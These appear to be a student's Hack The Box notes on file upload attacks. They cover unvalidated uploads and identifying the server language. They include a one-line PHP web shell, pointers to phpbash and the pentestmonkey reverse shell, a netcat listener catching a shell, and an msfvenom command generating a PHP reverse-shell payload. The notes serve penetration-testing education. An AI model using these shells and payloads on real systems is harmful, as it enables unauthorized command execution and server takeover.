- [File Upload Attacks](#file-upload-attacks)
  - [Absent Validation](#absent-validation)
    - [Arbitrary File Upload](#arbitrary-file-upload)
    - [Identifying Web Framework](#identifying-web-framework)
    - [Vulnerability Identification](#vulnerability-identification)
  - [Upload Exploitation](#upload-exploitation)
    - [Web Shells](#web-shells)
    - [Writing Custom Web Shell](#writing-custom-web-shell)
    - [Reverse Shell](#reverse-shell)
    - [Generating Custom Reverse Shell Scripts](#generating-custom-reverse-shell-scripts)

---

[Cheatsheet File Upload Attacks](../../../cheatsheets/File_Upload_Attacks_Module_Cheat_Sheet.pdf)

# File Upload Attacks

Uploading a file has become a key feature for most modern web applications to allow the extensibility of web apps with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.

However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.

The worst possbile kind of file upload vulnerability is an unauthenticated arbitrary file upload. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

## Absent Validation

The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files, allowing the upload of any file type by default.

With these types of vulnerable web apps, you may directly upload your web shell or reverse shell script to the web application, and then by just visiting the uploaded script, you can interact with you web shell or send the reverse shell.

### Arbitrary File Upload

The following web app allows you to upload personal files. The web app does not mention anythin about what file types are allowed, and you can drag and drop any file you want. Furthermore, if you click on the form to select a file, the file selector dialog does not specify any file type, as it says ```All Files``` for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application.

![upload](../../../images/file_upload1.png)

All of this tells you that the programm appears to have no file type restrictions on the front-end, and if no restrictions were specified on the back-end, you might be able to upload arbitrary file type to the back-end server to gain complete control over it.

### Identifying Web Framework

You need to upload a malicious script to test whether you can upload any file type to the back-end and test whether you can use this to exploit the back-end server. Many kinds of scripts can help you exploit web applications through arbitrary file upload, most commonly a Web Shell script and a Reverse Shell script.

A web shell provides you with an easy method to interact with the back-end server by accepting shell commands and printing their output back to you within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform specific funtions and commands to execute system commands on the back-end server, making web shell non-cross plattform scripts. So, the first step would be to identify what language runs the web app.

Possibilites:

- looking at the web page extension in the URLs
- visit ```/index.ext``` where you should swap out ```ext``` with various common web extensions, like ```php```, ```asp```, ```aspx```.
- tools like Wappalyzer

### Vulnerability Identification

To identify whether you can upload arbitrary files (_PHP in this case_), you can upload the following file:

```php
<?php echo "Hello HTB";?> 
```

To verify that it worked:

![hello htb](../../../images/file_upload2.png)

## Upload Exploitation

### Web Shells

One good option for a PHP web shell is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, SecLists provides a plethora of web shells for different frameworks and languages.

### Writing Custom Web Shell

Although using web shells from online resources can provide a great experience, you should also know how to write a simple web shell manually. This is because you may not have access to online tools during some penetration tests, so you need to be able to create one when needed.

With PHP web app, you can use the ```system()``` function that executes system commands and prints their output, and pass it the ```cmd``` parameter with ```$_REQUEST['cmd']```:

```php
<?php system($_REQUEST['cmd']); ?>
```

If you write the above script to ```shell.php``` and upload it to your web application, you can execute system commands with the ```?cmd=``` GET parameter:

![uid](../../../images/file_upload3.png)

### Reverse Shell

To receive reverse shells through the vulnerable upload functionality, you should start by downloading a reverse shell script in the language of the web app. One reliable reverse shell for PHP is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. After downloading the pentestmonkey script, you need to change the values for IP and PORT.

At this point you should start a netcat listener on your machine, upload the script to the web app, and then visit its link to execute the script and get a reverse shell.

```bash
d41y@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Generating Custom Reverse Shell Scripts

Tools like msfvenom can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place.

```bash
d41y@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

> [!TIP]
> You can generate reverse shell scripts for several languages. You can use many reverse shell payloads with the ```-p``` flag and specify the output language with the ```-f``` flag.

